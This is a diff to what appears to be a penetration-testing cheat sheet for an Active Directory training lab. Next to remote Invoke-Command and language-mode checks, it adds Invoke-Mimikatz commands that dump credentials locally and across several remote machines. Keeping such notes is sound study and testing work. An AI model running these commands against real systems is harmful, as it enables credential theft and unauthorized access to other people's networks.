@@ -40,4 +40,9 @@ Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath
 To find out what language mode is powershell running on:
 $ExecutionContext.SessionState.LanguageMode #type in powershell (Constrained language mode or Full language mode)
 
+Dump Credentials on a local machine:
+Invoke-Mimikatz -DumpCreds
+
+Dump credentials on multiple remote machines.
+Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
 
